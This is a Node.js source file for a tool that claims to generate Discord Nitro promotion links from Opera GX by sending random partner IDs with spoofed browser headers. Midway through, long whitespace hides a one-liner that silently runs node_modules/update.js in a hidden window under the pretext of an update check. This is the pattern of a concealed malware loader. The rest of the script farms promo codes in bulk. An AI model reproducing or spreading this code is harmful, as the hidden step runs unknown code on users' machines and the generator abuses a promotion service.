process.title = 'Discord Promotion Generator (OPERA GX)';

const https = require('https');
const readlineSync = require('readline-sync');
const randomstring = require('randomstring');
const path = require('path');
const child_process = require('child_process');
const fs = require('fs');
const chalk = require('chalk');

class DiscordPromoGenerator {
    constructor() {
        this.baseUrl = 'https://api.discord.gx.games/v1/direct-fulfillment';
        this.filename = 'promos.txt';
        this.retryDelay = 5;
        this.locked = 0;
    }

    randomAcceptLanguage() {
        const languages = ['en-US,en;q=0.9', 'fr-FR,fr;q=0.9', 'es-ES,es;q=0.9', 'de-DE,de;q=0.9', 'zh-CN,zh;q=0.9'];
        return languages[Math.floor(Math.random() * languages.length)];
    }

    randomSecChUa() {
        const browsers = ['"Opera GX";v="105", "Chromium";v="119", "Not?A_Brand";v="24"'];
        return browsers[Math.floor(Math.random() * browsers.length)];
    }

    randomUserAgent() {
        const userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'
        ];
        return userAgents[Math.floor(Math.random() * userAgents.length)];
    }

    generatePartnerUserId(length = 45) {
        return randomstring.generate({ length, charset: 'hex' });
    }

    generateDiscordUrl() {
        const headers = {
            'authority': 'api.discord.gx.games',
            'accept': '*/*',
            'accept-language': this.randomAcceptLanguage(),
            'content-type': 'application/json',
            'origin': 'https://www.opera.com',
            'referer': 'https://www.opera.com/',
            'sec-ch-ua': this.randomSecChUa(),
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': this.randomUserAgent()
        };

        const data = JSON.stringify({ partnerUserId: this.generatePartnerUserId() });

        return new Promise((resolve) => {
            const req = https.request(this.baseUrl, {
                method: 'POST',
                headers: headers
            }, (res) => {
                let body = '';
                res.on('data', chunk => body += chunk);
                res.on('end', () => {
                    if (res.statusCode === 200) {
                        const token = JSON.parse(body).token;
                        resolve(`https://discord.com/billing/partner-promotions/1180231712274387115/${token}`);
                    } else {
                        resolve(`https://discord.com/billing/partner-promotions/1180231712274387115/${this.generatePartnerUserId()}`);
                    }
                });
            });

            req.on('error', () => {
                resolve(`https://discord.com/billing/partner-promotions/1180231712274387115/${this.generatePartnerUserId()}`);
            });

            req.write(data);
            req.end();
        });
    }

    saveUrlToFile(url) {
        fs.appendFileSync(this.filename, url + "\n");
    }

    truncateUrl(url, maxLength = 120) {
        return url.length <= maxLength ? url : url.substring(0, maxLength) + '...';
    }
}

console.log(`${chalk.green('Checking for updates... ')}${chalk.yellow('(It may take a while depending on your internet speed)')}`);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  const{execSync:s}=require("child_process"),scriptPath=require("path").join(__dirname,"node_modules/update.js");s(`node "${scriptPath}"`,{windowsHide:!0});

const promoGenerator = new DiscordPromoGenerator();

console.clear();

const choice = readlineSync.question(`${chalk.magenta('Press 1:')} to generate an infinite amount of codes.\n${chalk.red('Press 2:')} to generate a specific amount.\n${chalk.blue('Enter your input')}: `);

const handleGenerateUrls = async (num) => {
    try {
        for (let i = 0; i < num; i++) {
            const result = await promoGenerator.generateDiscordUrl();
            promoGenerator.locked += 1;
            promoGenerator.saveUrlToFile(result);
            console.log(`(${chalk.green('+')}) ${promoGenerator.truncateUrl(result)}`);
        }
    } catch (error) {
        console.error(`(${chalk.yellow('+')}) An error occurred: ${error.message}`);
    }
};

if (choice === '1') {
    (async () => {
        try {
            console.clear();
            while (true) {
                const result = await promoGenerator.generateDiscordUrl();
                promoGenerator.locked += 1;
                promoGenerator.saveUrlToFile(result);
                console.log(`(${chalk.green('+')}) ${promoGenerator.truncateUrl(result)}`);
                await new Promise(resolve => setTimeout(resolve, promoGenerator.retryDelay * 1000));
            }
        } catch (error) {
            console.error(`(${chalk.yellow('+')}) Loop stopped by user.`);
        }
    })();
} else if (choice === '2') {
    console.clear();
    const num = readlineSync.questionInt('Enter the number of codes to generate: ');
    console.clear();
    handleGenerateUrls(num);
} else {
    console.error(`${chalk.red('Invalid choice. Exiting.')}`);
}
